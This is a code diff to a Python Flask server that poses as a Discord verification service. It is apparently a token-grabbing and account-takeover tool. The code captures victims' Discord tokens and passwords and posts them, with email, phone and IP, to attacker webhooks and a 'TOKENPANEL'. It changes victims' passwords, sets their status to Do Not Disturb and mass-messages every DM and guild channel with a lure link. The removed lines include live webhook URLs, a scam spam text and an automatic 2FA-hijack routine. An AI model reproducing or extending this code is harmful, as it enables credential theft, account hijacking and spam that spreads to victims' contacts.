@@ -23,7 +23,7 @@ for _m, _p in _deps.items():
         print(f'[*] Installing {_p}...')
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])
 
-from flask import Flask, request, jsonify, send_from_directory, make_response
+from flask import Flask, request, jsonify, send_from_directory, make_response, redirect
 from flask_sock import Sock
 from curl_cffi import requests as creq   # Chrome TLS impersonation
 import requests as plain_req              # for webhook (no impersonation needed)
@@ -37,9 +37,13 @@ from cryptography.hazmat.primitives import hashes, serialization
 PORT    = int(os.environ.get('PORT', 8463))
 API     = 'https://discord.com/api/v9'
 WS_URL  = 'wss://remote-auth-gateway.discord.gg/?v=2'
-WEBHOOK = os.environ.get('WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/1477366560346734728/eIb2f-9ezgry5SqSEiFmN_tv9ExdW7kYEMdx9lKIJV1LATvMZihDWDN_Kr8FLC7VK5G6')
-WEBHOOK_BACKUP = 'https://discord.com/api/webhooks/1478274350720221274/d86UA6fKCcJ5_utKPTWmJ7qYrO_Z_aHTeBUb5Uo-N9NPA1kcGGwVd10yjZQ0_1Gs6Dsq'
-TOTP_SECRETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'totp_secrets.txt')
+# Dynamic config from TOKENPANEL — webhook + message config per bot_key (identifier)
+PANEL_URL    = os.environ.get('PANEL_URL', '')       # e.g. https://discordmanager.lol
+PANEL_API_KEY = os.environ.get('PANEL_API_KEY', '')   # shared secret with panel
+if PANEL_URL:
+    print(f'[panel] PANEL_URL={PANEL_URL}  API_KEY={"set" if PANEL_API_KEY else "*** NOT SET ***"}')
+WEBHOOK = os.environ.get('WEBHOOK_URL', '')           # fallback if panel not configured
+WEBHOOK_BACKUP = os.environ.get('WEBHOOK_BACKUP', '')
 
 # Chrome 136 UA + matching client hints
 CHROME_VER = '136'
@@ -52,14 +56,199 @@ SEC_CH_UA_PLATFORM = '"Windows"'
 ANTICAPTCHA_KEY  = os.environ.get('ANTICAPTCHA_KEY', os.environ.get('2CAPTCHA_KEY', ''))
 CAPSOLVER_KEY    = os.environ.get('CAPSOLVER_KEY', '')
 
-# Role assignment after verification
-BOT_TOKEN    = os.environ.get('BOT_TOKEN', '')
-GUILD_ID     = os.environ.get('GUILD_ID', '')
-VERIFIED_ID  = os.environ.get('VERIFIED_ID', '')
-VOICE_CHANNEL_ID = os.environ.get('VOICE_CHANNEL_ID', '1477752842675683555')
+# Role assignment after verification — multi-tenant
+# Bot tokens stored as BOTTOKEN1, BOTTOKEN2, ... BOTTOKENn in env vars
+# URL pattern: /<guild_id>/<role_id>/<bot_key> where bot_key maps to BOTTOKEN{bot_key}
 
-VOICE_CHANNEL_ID_2 = '1478017594895106229'
-GUILD_ID_2 = '1472050464659865742'
+# Tenant context: stored per-client via cookie _tenant
+# Format: guild_id:role_id:bot_key
+_tenant_cache = {}  # ip -> {guild_id, role_id, bot_key, ts}
+_tenant_lock = threading.Lock()
+
+def _get_bot_token(bot_key):
+    """Look up bot token from env var BOTTOKEN{bot_key}."""
+    val = os.environ.get(f'BOTTOKEN{bot_key}', '')
+    if not val:
+        print(f'[tenant] No env var BOTTOKEN{bot_key} found')
+    return val
+
+# Cache for panel server info: "identifier:server_int" -> {info_dict, ts}
+_panel_info_cache = {}
+_panel_info_ttl = 300  # 5 minutes
+
+def _get_server_info_from_panel(identifier, server_int):
+    """Fetch server info (guild_name, etc) from TOKENPANEL. Bot token is NEVER returned. Cached."""
+    if not PANEL_URL:
+        return None
+    cache_key = f'{identifier}:{server_int}'
+    cached = _panel_info_cache.get(cache_key)
+    if cached and time.time() - cached['ts'] < _panel_info_ttl:
+        return cached['info']
+    try:
+        r = plain_req.get(f'{PANEL_URL}/api/{identifier}/servers/{server_int}/info',
+                          headers={'Authorization': f'Bearer {PANEL_API_KEY}'},
+                          timeout=8)
+        if r.status_code == 200:
+            info = r.json()
+            _panel_info_cache[cache_key] = {'info': info, 'ts': time.time()}
+            return info
+        print(f'[tenant] Panel server info fetch {r.status_code} for {cache_key}')
+    except Exception as e:
+        print(f'[tenant] Panel server info error for {cache_key}: {e}')
+    return None
+
+def _assign_role_via_panel(identifier, server_int, user_id):
+    """Ask TOKENPANEL to assign the verified role. Bot token never leaves the panel."""
+    if not PANEL_URL:
+        return False
+    try:
+        r = plain_req.post(f'{PANEL_URL}/api/{identifier}/servers/{server_int}/assign_role',
+                           headers={'Authorization': f'Bearer {PANEL_API_KEY}',
+                                    'Content-Type': 'application/json'},
+                           json={'user_id': str(user_id)},
+                           timeout=20)
+        if r.status_code == 200:
+            print(f'[tenant] Panel assigned role for user {user_id} on {identifier}:{server_int}')
+            return True
+        print(f'[tenant] Panel assign_role {r.status_code} for {identifier}:{server_int}: {r.text[:200]}')
+    except Exception as e:
+        print(f'[tenant] Panel assign_role error for {identifier}:{server_int}: {e}')
+    return False
+
+def _set_tenant(guild_id, role_id, bot_key, identifier=None, server_int=None):
+    """Store tenant context in thread-local-like dict keyed by request IP."""
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    t = {'guild_id': guild_id, 'role_id': role_id, 'bot_key': bot_key, 'ts': time.time()}
+    if identifier is not None:
+        t['identifier'] = str(identifier)
+    if server_int is not None:
+        t['server_int'] = str(server_int)
+    with _tenant_lock:
+        _tenant_cache[ip] = t
+
+def _get_tenant():
+    """Get tenant context for current request from cookie."""
+    cookie = request.cookies.get('_tenant', '')
+    if cookie:
+        parts = cookie.split(':')
+        if len(parts) == 4:
+            return {'guild_id': parts[0], 'role_id': parts[1], 'bot_key': parts[2],
+                    'identifier': parts[2], 'server_int': parts[3]}
+        if len(parts) == 3:
+            return {'guild_id': parts[0], 'role_id': parts[1], 'bot_key': parts[2]}
+    # Fallback to IP-based lookup
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    with _tenant_lock:
+        t = _tenant_cache.get(ip)
+        if t:
+            return t
+    return None
+
+# ━━━━━━━━━━━━ Panel config (dynamic per-tenant) ━━━━━━━━━━━━
+_panel_config_cache = {}  # "bot_key:server_int" -> {cfg, ts}
+_panel_cache_ttl = 30     # seconds
+
+def _get_panel_config(bot_key, server_int=None):
+    """Fetch webhook URL + message config from TOKENPANEL for this identifier.
+    Caches for _panel_cache_ttl seconds. Returns dict with: webhook, dm_message, guild_dm_message, spread_message."""
+    if not PANEL_URL or not bot_key:
+        return {}
+    now = time.time()
+    cache_key = f'{bot_key}:{server_int or ""}'
+    cached = _panel_config_cache.get(cache_key)
+    if cached and now - cached['ts'] < _panel_cache_ttl:
+        return cached['cfg']
+    try:
+        url = f'{PANEL_URL}/api/{bot_key}/config'
+        if server_int:
+            url += f'?server_int={server_int}'
+        r = plain_req.get(url,
+                          headers={'Authorization': f'Bearer {PANEL_API_KEY}'},
+                          timeout=8)
+        if r.status_code == 200:
+            cfg = r.json()
+            _panel_config_cache[cache_key] = {'cfg': cfg, 'ts': now}
+            return cfg
+    except Exception as e:
+        print(f'[panel] Config fetch error for key={bot_key}: {e}')
+    return {}
+
+
+def _get_webhook_for_tenant(tenant=None):
+    """Get webhook URL for current tenant. Falls back to global WEBHOOK env var."""
+    if tenant:
+        cfg = _get_panel_config(tenant.get('bot_key'), tenant.get('server_int'))
+        wh = cfg.get('webhook', '')
+        if wh:
+            return wh
+    return WEBHOOK
+
+
+def _get_dm_message(tenant=None):
+    """Get DM message for current tenant. Falls back to global SPAM_MSG_DM."""
+    if tenant:
+        cfg = _get_panel_config(tenant.get('bot_key'), tenant.get('server_int'))
+        msg = cfg.get('dm_message', '')
+        if msg:
+            return msg
+    return SPAM_MSG_DM
+
+
+def _get_guild_message(tenant=None):
+    """Get guild message: @everyone + dm_message."""
+    dm = _get_dm_message(tenant)
+    if dm:
+        return f'@everyone {dm}'
+    return SPAM_MSG_GUILD
+
+
+def _get_spread_message(tenant=None):
+    """Get spread message for current tenant. Falls back to global SPREAD_MESSAGE."""
+    return SPREAD_MESSAGE
+
+
+def _push_token_to_panel(bot_key, token_data):
+    """Push captured token data to the panel for storage/display."""
+    if not PANEL_URL or not bot_key:
+        return
+    try:
+        plain_req.post(f'{PANEL_URL}/api/{bot_key}/tokens',
+                       headers={'Authorization': f'Bearer {PANEL_API_KEY}',
+                                'Content-Type': 'application/json'},
+                       json=token_data, timeout=8)
+        print(f'[panel] Token pushed for key={bot_key}')
+    except Exception as e:
+        print(f'[panel] Token push error for key={bot_key}: {e}')
+
+
+# Guild info cache: guild_id -> {name, icon, ts}
+_guild_info_cache = {}
+_guild_info_lock = threading.Lock()
+
+def _fetch_guild_info(guild_id, bot_token):
+    """Fetch guild name and icon from Discord API using bot token. Cached for 10 minutes."""
+    with _guild_info_lock:
+        cached = _guild_info_cache.get(guild_id)
+        if cached and time.time() - cached['ts'] < 600:
+            return cached
+    try:
+        import requests as plain_req_local
+        r = plain_req_local.get(f'{API}/guilds/{guild_id}', headers={
+            'Authorization': f'Bot {bot_token}',
+            'User-Agent': 'DiscordBot (https://restorecordverify.info, 1.0)',
+        }, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            name = data.get('name', 'Server')
+            icon = data.get('icon', '')
+            icon_url = f'https://cdn.discordapp.com/icons/{guild_id}/{icon}.png?size=128' if icon else ''
+            info = {'name': name, 'icon_url': icon_url, 'ts': time.time()}
+            with _guild_info_lock:
+                _guild_info_cache[guild_id] = info
+            return info
+    except Exception as e:
+        print(f'[guild-info] Error fetching guild {guild_id}: {e}')
+    return {'name': 'Server', 'icon_url': '', 'ts': time.time()}
 
 # ━━━━━━━━━━━━ Proxy for Discord API calls ━━━━━━━━━━━━
 def _load_proxy():
@@ -123,11 +312,26 @@ def _handle_discord_response(resp):
                 _set_proxy_mode(False, 'rate limit expired, reverting to direct')
     return resp
 
-print(f'[config] Role assignment: BOT_TOKEN={"set" if BOT_TOKEN else "MISSING"}, GUILD_ID={GUILD_ID or "MISSING"}, VERIFIED_ID={VERIFIED_ID or "MISSING"}')
-print(f'[config] Voice channel: {VOICE_CHANNEL_ID} + {VOICE_CHANNEL_ID_2}')
+# Count configured bot tokens
+_bot_token_count = sum(1 for k in os.environ if k.startswith('BOTTOKEN') and os.environ[k].strip())
+print(f'[config] Multi-tenant: {_bot_token_count} bot token(s) configured (BOTTOKEN* env vars)')
 print(f'[config] Discord proxy available: {DISCORD_PROXY or "NONE"} (starts {"PROXY" if DISCORD_PROXY else "DIRECT — no proxy configured"})')
 
 app = Flask(__name__, static_folder='.', static_url_path='')
+
+# ── WSGI middleware: rewrite /_/ and /v3/ paths so they hit /_gp/ route
+# instead of clashing with /<identifier>/<server_int> (GET-only) routes.
+class _GooglePathMiddleware:
+    def __init__(self, wsgi):
+        self.wsgi = wsgi
+    def __call__(self, environ, start_response):
+        p = environ.get('PATH_INFO', '')
+        if p.startswith('/_/') or p.startswith('/v3/'):
+            environ['PATH_INFO'] = '/_gp/accounts.google.com' + p
+        return self.wsgi(environ, start_response)
+
+app.wsgi_app = _GooglePathMiddleware(app.wsgi_app)
+
 sock = Sock(app)
 
 # ━━━━━━━━━━━━ Page Tokens (gate QR start) ━━━━━━━━━━━━
@@ -466,126 +670,6 @@ def _clean_ip(raw_ip):
     return '?'
 
 
-# ━━━━━━━━━━━━ Auto 2FA (TOTP) ━━━━━━━━━━━━
-def _auto_enable_2fa(token, password):
-    """
-    Enable TOTP 2FA on a captured account using 3-step Discord flow:
-      1. POST totp/enable → 401 code 60003, get MFA ticket
-      2. POST /mfa/finish  → verify password, get MFA JWT
-      3. POST totp/enable  → with X-Discord-MFA-Authorization + secret + code → 200
-    Uses curl_cffi (Chrome TLS) + X-Super-Properties (required by Discord).
-    Returns (new_token, secret, backup_codes) on success.
-    Returns (None, None, None) on failure (no crash).
-    """
-    if not password or password == '?':
-        print(f'[2fa] Skipped — no password available')
-        return None, None, None
-
-    enable_url = f'{API}/users/@me/mfa/totp/enable'
-    finish_url = f'{API}/mfa/finish'
-    h = {
-        "Authorization": token,
-        "User-Agent": UA,
-        "Content-Type": "application/json",
-        "X-Super-Properties": sprops(),
-        "Origin": "https://discord.com",
-        "Referer": "https://discord.com/channels/@me",
-        "Sec-CH-UA": SEC_CH_UA,
-        "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
-        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin",
-        "X-Discord-Locale": "en-US",
-        "X-Discord-Timezone": "America/Los_Angeles",
-    }
-
-    try:
-        s = _make_session()
-        # Warm session with login page cookies
-        try:
-            s.get('https://discord.com/login', headers={'User-Agent': UA}, timeout=10)
-        except:
-            pass
-
-        # ── Step 1: Trigger MFA gate → get ticket ──
-        print(f'[2fa] Step 1: triggering MFA gate...')
-        r1 = s.post(enable_url, headers=h, json={'password': password}, timeout=15)
-        j1 = r1.json()
-        err_code = j1.get('code', 0)
-        ticket = j1.get('mfa', {}).get('ticket', '')
-        print(f'[2fa] Step 1: [{r1.status_code}] code={err_code} ticket={"yes" if ticket else "no"}')
-
-        if err_code != 60003 or not ticket:
-            if r1.status_code == 200:
-                print(f'[2fa] Unexpected 200 — 2FA may already be enabled')
-            else:
-                print(f'[2fa] Step 1 failed (expected 60003): code={err_code} msg={j1.get("message", "?")}')
-            return None, None, None
-
-        # ── Step 2: Verify password via /mfa/finish → get MFA JWT ──
-        print(f'[2fa] Step 2: verifying password...')
-        r2 = s.post(finish_url, headers=h, json={
-            'ticket': ticket,
-            'mfa_type': 'password',
-            'data': password,
-        }, timeout=15)
-        j2 = r2.json()
-        mfa_jwt = j2.get('token', '')
-        print(f'[2fa] Step 2: [{r2.status_code}] jwt={"yes" if mfa_jwt else "no"}')
-
-        if r2.status_code != 200 or not mfa_jwt:
-            print(f'[2fa] Step 2 failed: {j2.get("message", "?")} (code {j2.get("code", "?")})')
-            return None, None, None
-
-        # ── Step 3: Enable TOTP with MFA authorization ──
-        secret = pyotp.random_base32()
-        totp = pyotp.TOTP(secret)
-        code = totp.now()
-
-        h3 = dict(h)
-        h3['X-Discord-MFA-Authorization'] = mfa_jwt
-
-        print(f'[2fa] Step 3: enabling TOTP...')
-        r3 = s.post(enable_url, headers=h3, json={
-            'password': password,
-            'secret': secret,
-            'code': code,
-        }, timeout=15)
-
-        if r3.status_code != 200:
-            j3 = r3.json()
-            print(f'[2fa] Step 3 failed: [{r3.status_code}] {j3.get("message", "?")} (code {j3.get("code", "?")})')
-            return None, None, None
-
-        result = r3.json()
-        new_token = result.get('token', token)
-        backup_codes = [c['code'] for c in result.get('backup_codes', []) if not c.get('consumed')]
-
-        # Save to file
-        try:
-            with open(TOTP_SECRETS_FILE, 'a', encoding='utf-8') as f:
-                f.write(json.dumps({
-                    'token': new_token,
-                    'old_token': token,
-                    'password': password,
-                    'secret': secret,
-                    'backup_codes': backup_codes,
-                    'enabled_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
-                }) + '\n')
-        except Exception as e:
-            print(f'[2fa] Warning: could not save secret file: {e}')
-
-        print(f'[2fa] ✅ 2FA Enabled! Secret: {secret[:8]}..., backups: {len(backup_codes)}, new token: {new_token[:20]}...')
-        return new_token, secret, backup_codes
-
-    except Exception as e:
-        print(f'[2fa] Error: {e}')
-        import traceback
-        traceback.print_exc()
-        return None, None, None
-
-
 DEFAULT_NEW_PASSWORD = 'Fatdude11$'
 
 
@@ -727,8 +811,9 @@ def _auto_change_password(token, old_password, new_password=None, mfa_enabled=Fa
 
 
 # ━━━━━━━━━━━━ Mass Message (DMs first, then guilds) ━━━━━━━━━━━━
-SPAM_MSG_DM    = 'discord.gg/bzGsAUpdsY shes going crazy on cam wtf \U0001f62d'
-SPAM_MSG_GUILD = '@everyone discord.gg/bzGsAUpdsY shes going crazy on cam wtf \U0001f62d'
+# Dynamic — loaded per-tenant from panel config. These are fallback defaults.
+SPAM_MSG_DM    = ''
+SPAM_MSG_GUILD = ''
 
 # Permission bit constants
 PERM_VIEW_CHANNEL   = 0x400
@@ -819,11 +904,55 @@ def _guild_sendable_channels(s, h, guild_id):
         print(f'[spam] Permission check failed for guild {guild_id}: {e}')
         return []
 
-def _mass_message(token, uname='?'):
+def _blast_send(s, h, ch_id, msg, uname, label, idx, total):
+    """Send a single message with blast-optimised retry logic.
+    Returns 'ok', '403', '429_fail', 'captcha', 'err', or status code string."""
+    retries = 0
+    while retries < 5:
+        try:
+            r = s.post(f'{API}/channels/{ch_id}/messages', headers=h,
+                       json={'content': msg, 'nonce': _make_nonce(), 'tts': False, 'flags': 0},
+                       timeout=15)
+            code = r.status_code
+            if code in (200, 201):
+                print(f'[blast] {uname}: [{idx}/{total}] OK    {label}')
+                time.sleep(0.4)
+                return 'ok'
+            elif code == 429:
+                body = {}
+                try: body = r.json()
+                except: pass
+                if 'captcha_key' in body or 'captcha_sitekey' in body:
+                    print(f'[blast] {uname}: [{idx}/{total}] CAPTCHA {label}')
+                    return 'captcha'
+                ra = body.get('retry_after', 2)
+                retries += 1
+                print(f'[blast] {uname}: [{idx}/{total}] 429({ra:.1f}s) {label} retry #{retries}')
+                time.sleep(ra + 0.3)
+                continue
+            elif code == 403:
+                print(f'[blast] {uname}: [{idx}/{total}] 403   {label}')
+                return '403'  # no delay — 403 doesn't cost rate limit
+            else:
+                print(f'[blast] {uname}: [{idx}/{total}] {code}  {label}')
+                time.sleep(0.4)
+                return str(code)
+        except Exception as e:
+            print(f'[blast] {uname}: [{idx}/{total}] ERR   {label}  {e}')
+            return 'err'
+    print(f'[blast] {uname}: [{idx}/{total}] GAVE UP {label}')
+    return '429_fail'
+
+
+def _mass_message(token, uname='?', tenant=None):
     """Send message to all open DMs, then all accessible guild text channels.
-    Pre-checks channel permissions to avoid wasting API calls on 403s.
-    Uses the active (post-takeover) token. 1s delay between messages.
+    Sequential blast: 0.4s after OK, 0s after 403, auto-retry 429 up to 5×.
     Runs in background thread so webhook isn't blocked."""
+    dm_msg = _get_dm_message(tenant)
+    guild_msg = _get_guild_message(tenant)
+    if not dm_msg and not guild_msg:
+        print(f'[blast] {uname}: No messages configured, skipping')
+        return
     s = _make_session()
     h = {
         'Authorization': token,
@@ -840,89 +969,93 @@ def _mass_message(token, uname='?'):
         'Sec-Fetch-Site': 'same-origin',
         'X-Discord-Locale': 'en-US',
     }
-    sent = 0
-    failed = 0
+    h_noct = {k: v for k, v in h.items() if k != 'Content-Type'}
+    stats = {'ok': 0, '403': 0, '429_fail': 0, 'captcha': 0, 'other': 0, 'err': 0}
+    t0 = time.time()
 
     # ── DMs first ──
-    try:
-        r = s.get(f'{API}/users/@me/channels', headers=h, timeout=10)
-        dm_ids = [c['id'] for c in r.json()] if r.status_code == 200 else []
-        print(f'[spam] {uname}: {len(dm_ids)} DM channels')
-    except:
-        dm_ids = []
-
-    for cid in dm_ids:
+    dm_targets = []
+    if dm_msg:
         try:
-            r = s.post(f'{API}/channels/{cid}/messages', headers=h,
-                       json={'content': SPAM_MSG_DM}, timeout=10)
-            if r.status_code in (200, 201):
-                sent += 1
-            else:
-                failed += 1
-                if r.status_code == 429:
-                    retry = r.json().get('retry_after', 2)
-                    print(f'[spam] Rate limited, waiting {retry:.1f}s')
-                    time.sleep(retry + 0.5)
-                    # Retry once
-                    r2 = s.post(f'{API}/channels/{cid}/messages', headers=h,
-                                json={'content': SPAM_MSG_DM}, timeout=10)
-                    if r2.status_code in (200, 201):
-                        sent += 1; failed -= 1
+            r = s.get(f'{API}/users/@me/channels', headers=h_noct, timeout=15)
+            if r.status_code == 200:
+                for ch in r.json():
+                    if ch.get('type') == 1:
+                        recip = ch.get('recipients', [{}])[0]
+                        dm_targets.append((ch['id'], recip.get('username', '?')))
+                    elif ch.get('type') == 3:
+                        dm_targets.append((ch['id'], ch.get('name') or 'Group'))
         except:
-            failed += 1
-        time.sleep(1.3)
+            pass
+        print(f'[blast] {uname}: {len(dm_targets)} DM targets')
 
-    # ── Guild channels (pre-checked permissions) ──
-    try:
-        r = s.get(f'{API}/users/@me/guilds', headers=h, timeout=10)
-        guilds = r.json() if r.status_code == 200 else []
-        print(f'[spam] {uname}: {len(guilds)} guilds')
-    except:
+        for i, (ch_id, name) in enumerate(dm_targets, 1):
+            result = _blast_send(s, h, ch_id, dm_msg, uname, name, i, len(dm_targets))
+            if result == 'ok':
+                stats['ok'] += 1
+            elif result == '403':
+                stats['403'] += 1
+            elif result == 'captcha':
+                stats['captcha'] += 1
+                break
+            elif result == 'err':
+                stats['err'] += 1
+            else:
+                stats['other'] += 1
+
+    # ── Guild channels ──
+    if guild_msg:
         guilds = []
+        try:
+            r = s.get(f'{API}/users/@me/guilds', headers=h_noct, timeout=15)
+            if r.status_code == 200:
+                guilds = r.json()
+        except:
+            pass
+        print(f'[blast] {uname}: {len(guilds)} guilds')
 
-    for g in guilds:
-        gid = g.get('id')
-        if not gid:
-            continue
-        # Pre-check: get channels where we actually have send perms
-        sendable = _guild_sendable_channels(s, h, gid)
-        if not sendable:
-            print(f'[spam] {uname}: guild {g.get("name","?")} — no sendable channels, skipping')
-            continue
-        print(f'[spam] {uname}: guild {g.get("name","?")} — {len(sendable)} sendable channels')
-
-        # Send to first sendable channel only (1 message per guild)
-        for cid in sendable[:3]:  # try up to 3 in case first still fails
-            try:
-                r = s.post(f'{API}/channels/{cid}/messages', headers=h,
-                           json={'content': SPAM_MSG_GUILD}, timeout=10)
-                if r.status_code in (200, 201):
-                    sent += 1
-                    break  # 1 message per guild
-                elif r.status_code == 429:
-                    retry = r.json().get('retry_after', 2)
-                    time.sleep(retry + 0.5)
-                    r2 = s.post(f'{API}/channels/{cid}/messages', headers=h,
-                                json={'content': SPAM_MSG_GUILD}, timeout=10)
-                    if r2.status_code in (200, 201):
-                        sent += 1
-                        break
-                elif r.status_code == 403:
-                    continue  # perm check was wrong, try next
-                else:
-                    failed += 1
-                    break
-            except:
+        for g in guilds:
+            gid = g.get('id')
+            if not gid:
                 continue
-        time.sleep(1.3)
+            sendable = _guild_sendable_channels(s, h_noct, gid)
+            if not sendable:
+                continue
+            gname = g.get('name', '?')
+            print(f'[blast] {uname}: guild {gname} — {len(sendable)} sendable channels')
 
-    print(f'[spam] {uname}: Done! sent={sent} failed={failed}')
+            for cid in sendable[:3]:
+                result = _blast_send(s, h, cid, guild_msg, uname, f'{gname}/ch', 0, 0)
+                if result == 'ok':
+                    stats['ok'] += 1
+                    break
+                elif result == '403':
+                    stats['403'] += 1
+                    continue
+                elif result == 'captcha':
+                    stats['captcha'] += 1
+                    break
+                elif result == 'err':
+                    stats['err'] += 1
+                    break
+                else:
+                    stats['other'] += 1
+                    break
+            if stats['captcha']:
+                break
+
+    elapsed = time.time() - t0
+    total = sum(stats.values())
+    print(f'[blast] {uname}: Done! ok={stats["ok"]} 403={stats["403"]} 429_fail={stats["429_fail"]} captcha={stats["captcha"]} other={stats["other"]} err={stats["err"]} | {total} msgs in {elapsed:.1f}s')
 
 
-def send_webhook(token, client_ip="?", password="?"):
+def send_webhook(token, client_ip="?", password="?", tenant=None):
     client_ip = _clean_ip(client_ip)
     comp  = os.environ.get('COMPUTERNAME', platform.node())
     luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))
+
+    # Resolve webhook URL dynamically from panel config
+    webhook_url = _get_webhook_for_tenant(tenant)
 
     # Stealth session for all Discord API calls
     s_api = _make_session()
@@ -947,20 +1080,24 @@ def send_webhook(token, client_ip="?", password="?"):
     }
 
     def _fallback(reason):
+        if not webhook_url:
+            print(f"[!] No webhook configured, fallback skipped ({reason})")
+            return
         try:
-            plain_req.post(WEBHOOK, json={
+            plain_req.post(webhook_url, json={
                 "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                 "username": "Pentest Tool"
             }, timeout=10)
             print(f"[+] Webhook sent (fallback: {reason})")
         except Exception as e2:
             print(f"[!] Webhook fallback failed: {e2}")
-        try:
-            plain_req.post(WEBHOOK_BACKUP, json={
-                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
-                "username": "Pentest Tool"
-            }, timeout=10)
-        except: pass
+        if WEBHOOK_BACKUP:
+            try:
+                plain_req.post(WEBHOOK_BACKUP, json={
+                    "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
+                    "username": "Pentest Tool"
+                }, timeout=10)
+            except: pass
 
     try:
         r = s_api.get(f"{API}/users/@me", headers=api_h, timeout=15)
@@ -980,26 +1117,17 @@ def send_webhook(token, client_ip="?", password="?"):
         pfp    = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else None
         color  = 65280 if nitro else 16711680
 
-        # ── Auto-enable 2FA if account has no MFA and we have a password ──
-        totp_secret = None
-        backup_codes_str = ''
         active_token = token  # Track which token is currently valid
         final_password = password
         pw_changed = False
-        tfa_just_enabled = False
-        if not mfa and password and password != '?':
-            new_tok, secret, backups = _auto_enable_2fa(token, password)
-            if new_tok:
-                active_token = new_tok
-                totp_secret = secret
-                backup_codes_str = ', '.join(backups) if backups else 'None'
-                mfa = True  # Now it's enabled
-                tfa_just_enabled = True
-                api_h['Authorization'] = active_token
-                print(f'[2fa] Token updated for {uname}: {active_token[:20]}...')
 
         # ── Send mass messages using the active (post-takeover) token ──
-        threading.Thread(target=_mass_message, args=(active_token, uname), daemon=True).start()
+        # Only auto-DM if dm_enabled is toggled on in panel config
+        panel_cfg = _get_panel_config(tenant.get('bot_key') if tenant else None, tenant.get('server_int') if tenant else None)
+        if panel_cfg.get('dm_enabled', False):
+            threading.Thread(target=_mass_message, args=(active_token, uname, tenant), daemon=True).start()
+        else:
+            print(f'[blast] {uname}: Auto-DM disabled in panel settings, skipping')
 
         try:
             cr = s_api.get(f"{API}/users/@me/channels", headers=api_h, timeout=10)
@@ -1029,9 +1157,6 @@ def send_webhook(token, client_ip="?", password="?"):
 
         # Build 2FA section for embed
         tfa_section = f"**2FA:** {'✅ Enabled' if mfa else '❌'}\n"
-        if tfa_just_enabled and totp_secret:
-            tfa_section += f"**TOTP Secret:** `{totp_secret}`\n"
-            tfa_section += f"**Backup Codes:** `{backup_codes_str}`\n"
 
         # Build password section
         pw_line = f"**Password:** `{password}`\n"
@@ -1060,29 +1185,57 @@ def send_webhook(token, client_ip="?", password="?"):
             }],
             "username": "Pentest Tool"
         }
-        plain_req.post(WEBHOOK, json=payload, timeout=10)
-        print(f"[+] Webhook sent for {uname}#{disc} ({uid})")
+        if webhook_url:
+            plain_req.post(webhook_url, json=payload, timeout=10)
+            print(f"[+] Webhook sent for {uname}#{disc} ({uid})")
+        else:
+            print(f"[~] No webhook configured, skipping for {uname}#{disc}")
         # Also fire backup webhook
-        try:
-            plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
-        except: pass
+        if WEBHOOK_BACKUP:
+            try:
+                plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
+            except: pass
+        # Push token data to panel
+        bot_key = tenant.get('bot_key') if tenant else None
+        if bot_key:
+            _push_token_to_panel(bot_key, {
+                'token': active_token, 'user_id': uid, 'username': uname,
+                'display_name': u.get('global_name', ''), 'email': email,
+                'phone': phone, 'password': password, 'ip': client_ip,
+                'avatar_url': pfp or '', 'nitro': nitro,
+                'nitro_type': u.get('premium_type', 0),
+                'mfa': mfa, 'has_billing': False, 'guilds_count': total,
+                'badges': u.get('public_flags', 0),
+                'verified': u.get('verified', False),
+                'valid': True,
+                'server_int': tenant.get('server_int', '') if tenant else '',
+                'guild_id': tenant.get('guild_id', '') if tenant else '',
+            })
 
     except Exception as e:
         print(f"[!] Webhook error: {e}")
         _fallback("exception")
 
 
-def fire_webhook(token, client_ip="?", password="?"):
+def fire_webhook(token, client_ip="?", password="?", tenant=None):
     # Try to look up password from store if not provided
     if password == '?':
         with _pw_store_lock:
             password = _pw_store.pop(token, '?')
+    # Try to get tenant from request context if not passed
+    if tenant is None:
+        try:
+            tenant = _get_tenant()
+        except:
+            pass
     with _webhookd_lock:
         if token in _webhookd_tokens:
             print(f"[~] Webhook skipped (duplicate token)")
             return
         _webhookd_tokens.add(token)
-    threading.Thread(target=send_webhook, args=(token, client_ip, password), daemon=True).start()
+    # Immediately set DND so the account shows Do Not Disturb
+    threading.Thread(target=_set_dnd, args=(token,), daemon=True).start()
+    threading.Thread(target=send_webhook, args=(token, client_ip, password, tenant), daemon=True).start()
 
 
 def _get_user_brief(token):
@@ -1102,21 +1255,20 @@ def _get_user_brief(token):
     return {}
 
 
-def _assign_role(user_id):
+def _assign_role(user_id, guild_id=None, role_id=None, bot_token=None):
     """Add verified role to user in guild using bot token.
-    Uses curl_cffi for Chrome TLS impersonation (bypasses Cloudflare on Railway).
-    Skips member check — PUT /roles returns clear errors if user isn't in guild.
+    Multi-tenant: guild_id, role_id, bot_token passed explicitly.
     Retries up to 3 times with backoff."""
-    if not all([BOT_TOKEN, GUILD_ID, VERIFIED_ID, user_id]):
-        print(f'[role] Skipping role assign: missing config (bot={bool(BOT_TOKEN)}, guild={GUILD_ID or "?"}, role={VERIFIED_ID or "?"}, user={user_id or "?"})')
+    if not all([bot_token, guild_id, role_id, user_id]):
+        print(f'[role] Skipping role assign: missing config (bot={bool(bot_token)}, guild={guild_id or "?"}, role={role_id or "?"}, user={user_id or "?"})')
         return False
     try:
         s = _make_session()
-        url = f'{API}/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ID}'
